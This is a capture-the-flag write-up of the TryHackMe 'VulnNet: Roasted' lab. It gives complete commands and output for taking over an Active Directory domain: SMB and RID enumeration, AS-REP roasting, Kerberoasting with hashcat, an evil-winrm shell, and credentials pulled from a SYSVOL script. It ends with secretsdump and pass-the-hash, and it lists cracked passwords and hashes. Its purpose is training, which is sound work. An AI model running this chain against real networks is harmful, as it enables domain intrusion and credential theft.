---
title: "THM VulnNet: Roasted — AS-REP Roasting, Kerberoasting & SYSVOL Secrets"
date: 2026-05-17
categories: [TryHackMe, Active Directory]
tags: [thm, active-directory, kerberoasting, as-rep-roasting, smb, pass-the-hash, sysvol, windows]
classes: wide
---

# THM VulnNet: Roasted

**Difficulty:** EASY  
**OS:** Windows Server 2019  
**Platform:** TryHackMe  
**Category:** Active Directory  

---

## Overview

VulnNet: Roasted — the name is basically a roadmap. Two Kerberos attacks,
a credential hidden in plain sight inside SYSVOL, and a pass-the-hash to
finish it off. Great room for practising the AD attack fundamentals in order.

The full chain: anonymous SMB shares → employee names → RID brute force →
real usernames → AS-REP Roast → Kerberoast → WinRM shell → SYSVOL snooping
→ hardcoded creds → secretsdump → domain admin.
---

## Enumeration

### Nmap

```bash
nmap -sV -sS -T4 -A -Pn 10.81.139.27
```

```
PORT     STATE SERVICE           VERSION
53/tcp   open  domain
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl
3268/tcp open  ldap
3269/tcp open  globalcatLDAPssl
5985/tcp open  http              Microsoft HTTPAPI httpd 2.0
```

Standard AD port layout — Kerberos (88), LDAP (389), SMB (445).
One thing that stood out immediately: **port 5985 (WinRM)** is open.
Mental note filed for later.

OS is **Windows Server 2019**, domain is **vulnnet-rst.local**.

---

### SMB Enumeration

```bash
nxc smb 10.81.139.27
```

```
SMB  10.81.139.27  445  WIN-2BO8M1OE1M1  [*] Windows 10 / Server 2019
     Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local)
     (signing:True) (SMBv1:None) (Null Auth:True)
```

**Null Auth: True** — let's see what we can reach anonymously.

```bash
nxc smb 10.81.139.27 -u 'anonymous' -p '' --shares
```

```
Share                        Permissions
-----                        -----------
ADMIN$                       
C$                           
IPC$                         READ
NETLOGON                     
SYSVOL                       
VulnNet-Business-Anonymous   READ
VulnNet-Enterprise-Anonymous READ
```

Two non-standard shares with anonymous READ..our first clue.

---

### Enumerating the Anonymous Shares

```bash
smbclient //10.81.139.27/VulnNet-Business-Anonymous -N
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

Downloaded three txt files. Reading through them:

**Business-Manager.txt:**
> *Alexa Whitehat is our core business manager...*

**Business-Sections.txt:**
> *Jack Goldenhand is the person you should reach to for any business...*

```bash
smbclient //10.81.139.27/VulnNet-Enterprise-Anonymous -N
smb: \> mget *
```

**Enterprise-Safety.txt:**
> *Tony Skid is a core security manager and takes care of internal
> infrastructure...*

**Enterprise-Sync.txt:**
> *Johnny Leet keeps the whole infrastructure up to date...*

Four names extracted:
```
Alexa Whitehat
Jack Goldenhand
Tony Skid
Johnny Leet
```

Now we need the actual AD usernames..i almost wanted to try using a tool called username-anarchy...works pretty much like OneRuleToThemAll and would mutate the usernames into different possibiliteis and try it.
But we already have the guest account so no need.

---

### RID Brute Force

We have anonymous/guest access. Why guess username formats when we can
just ask the domain directly?

```bash
nxc smb 10.81.139.27 -u 'guest' -p '' --rid-brute 5000
```

```
1104: VULNNET-RST\enterprise-core-vn  (SidTypeUser)
1105: VULNNET-RST\a-whitehat          (SidTypeUser)
1109: VULNNET-RST\t-skid              (SidTypeUser)
1110: VULNNET-RST\j-goldenhand        (SidTypeUser)
1111: VULNNET-RST\j-leet              (SidTypeUser)
```

Real username format: **first initial + hyphen + lastname**.

---

## Initial Access

### AS-REP Roasting

The room is called *Roasted*...

AS-REP Roasting targets accounts with Kerberos pre-authentication disabled.
When pre-auth is off, the KDC hands out an encrypted ticket without first
verifying the password then we grab that ticket and crack it offline.

```bash
cat > users.txt << 'EOF'
a-whitehat
t-skid
j-goldenhand
j-leet
enterprise-core-vn
administrator
EOF

impacket-GetNPUsers vulnnet-rst.local/ \
    -usersfile users.txt \
    -dc-ip 10.81.139.27 \
    -no-pass \
    -format hashcat
```

```
[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:a0fd51f1b68ab702b4fd5f0545a7c6f1$...
[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User enterprise-core-vn doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
```

One account vulnerable: **t-skid**. Hash saved, time to crack.

```bash
hashcat -m 18200 t-skid.hash \
        /usr/share/wordlists/rockyou.txt \
        --force
```

```
$krb5asrep$23$t-skid...[hash]...:tj072889*
```

**Credentials:** `t-skid:tj072889*`

Verified:

```bash
nxc smb 10.81.139.27 -u 't-skid' -p 'tj072889*'
# [+] vulnnet-rst.local\t-skid:tj072889*
```

---

### Kerberoasting

With valid domain creds in our possession, time to enumerate service accounts with SPNs.

```bash
impacket-GetUserSPNs vulnnet-rst.local/t-skid:'tj072889*' \
    -dc-ip 10.81.139.27 \
    -request
```

```
ServicePrincipalName    Name                MemberOf
----------------------  ------------------  ----------------------------------------
CIFS/vulnnet-rst.local  enterprise-core-vn  CN=Remote Management Users,CN=Builtin,...

$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$vulnnet-rst.local/enterprise-core-vn*$...
```

Two things we got:
1. **enterprise-core-vn** is Kerberoastable
2. It's a member of **Remote Management Users** — WinRM access incoming

```bash
hashcat -m 13100 enterprise.hash \
        /usr/share/wordlists/rockyou.txt \
        --force
```

```
$krb5tgs$23$*enterprise-core-vn...[hash]...:ry=ibfkfv,s6h,
```

**Credentials:** `enterprise-core-vn:ry=ibfkfv,s6h,`

---

### WinRM Shell

```bash
nxc winrm 10.81.139.27 \
    -u 'enterprise-core-vn' \
    -p 'ry=ibfkfv,s6h,'
# [+] vulnnet-rst.local\enterprise-core-vn:ry=ibfkfv,s6h, (Pwn3d!)

evil-winrm -i 10.81.139.27 \
           -u 'enterprise-core-vn' \
           -p 'ry=ibfkfv,s6h,'
```

We're in.

```powershell
*Evil-WinRM* PS C:\Users\enterprise-core-vn\Desktop> type user.txt
THM{726b7c0baaac1455d05c827b5561f4ed}
```

**User Flag:** `THM{726b7c0baaac1455d05c827b5561f4ed}` ✅

---

## Privilege Escalation

### SYSVOL Enumeration — The Hidden Secret

enterprise-core-vn has low privileges: no admin access, no DCSync rights.
If those are blocked you look elsewhere.

SYSVOL is accessible to all authenticated domain users. Admins sometimes
store scripts there for automated tasks. Sometimes those scripts contain
hardcoded credentials. Let's check.

```bash
smbclient //10.81.174.210/SYSVOL \
    -U 'enterprise-core-vn%ry=ibfkfv,s6h,' \
    -W VULNNET-RST

smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

One file caught the eye immediately:

```
vulnnet-rst.local/scripts/ResetPassword.vbs
```

A password reset script sitting in SYSVOL. 
Something that *shouldn't* be there.
Can you guess what's inside? 😄

```bash
cat vulnnet-rst.local/scripts/ResetPassword.vbs
```

```vb
strUserNTName = "a-whitehat"
strPassword = "bNdKVkjv3RR9ht"
```

Plain text credentials for **a-whitehat** sitting in a file
readable by every domain user on the network.

Every sysadmin's nightmare.

---

### Verifying a-whitehat

```bash
nxc winrm 10.81.174.210 \
    -u 'a-whitehat' \
    -p 'bNdKVkjv3RR9ht'
```

```
WINRM  10.81.174.210  5985  WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\a-whitehat:bNdKVkjv3RR9ht (Pwn3d!)
```

`(Pwn3d!)` — domain admin level access.

### Secretsdump

```bash
impacket-secretsdump vulnnet-rst.local/a-whitehat:'bNdKVkjv3RR9ht'@10.81.174.210
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7633f01273fc92450b429d6067d1ca32:::
vulnnet-rst.local\enterprise-core-vn:1104:...:8752ed9e26e6823754dce673de76ddaf:::
vulnnet-rst.local\a-whitehat:1105:...:1bd408897141aa076d62e9bfc1a5956b:::
vulnnet-rst.local\t-skid:1109:...:49840e8a32937578f8c55fdca55ac60b:::
vulnnet-rst.local\j-goldenhand:1110:...:1b1565ec2b57b756b912b5dc36bc272a:::
vulnnet-rst.local\j-leet:1111:...:605e5542d42ea181adeca1471027e022:::
```

Full domain hash dump. Administrator NTLM: `c2597747aa5e43022a3a3049a3c3b09d`

---

### Pass-the-Hash → Root

```bash
evil-winrm -i 10.81.174.210 \
           -u 'Administrator' \
           -H 'c2597747aa5e43022a3a3049a3c3b09d'
```

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type system.txt
THM{16f45e3934293a57645f8d7bf71d8d4c}
```

**Root Flag:** `THM{16f45e3934293a57645f8d7bf71d8d4c}` ✅

Domain pwned.

---

## Credentials Summary

| Account | Credential | Method |
|---|---|---|
| t-skid | tj072889* | AS-REP Roast + hashcat |
| enterprise-core-vn | ry=ibfkfv,s6h, | Kerberoast + hashcat |
| a-whitehat | bNdKVkjv3RR9ht | ResetPassword.vbs in SYSVOL |
| Administrator | c2597747aa5e43022a3a3049a3c3b09d (NTLM) | secretsdump |

---

## Key Takeaways

**1. Anonymous shares leak employee info**
The txt files in VulnNet-Business-Anonymous and VulnNet-Enterprise-Anonymous
gave us real names. Names → username generation → attack surface.
Always enumerate non-standard shares thoroughly.

**2. RID brute beats username guessing**
We could have spent hours guessing formats — `t.skid`, `tony.skid`,
`tskid`. Instead, one command against the domain gave us the exact
usernames as they exist in AD. Use RID brute first, always.

**3. AS-REP Roasting needs no credentials**
This is why pre-authentication should never be disabled unless absolutely
necessary. One vulnerable account in the list was enough for a foothold.

**4. Kerberoasting with valid creds is devastating**
Once we had t-skid's password, service accounts with SPNs became
immediately targetable. enterprise-core-vn being in Remote Management
Users made it a perfect pivot point.

**5. SYSVOL is readable by all authenticated users**
Scripts stored in SYSVOL are accessible to every domain account.
Hardcoded credentials in those scripts = every user in the domain
can potentially read admin passwords. Classic misconfiguration.

*Written by 0x5h4q | 0x5h4q.github.io*
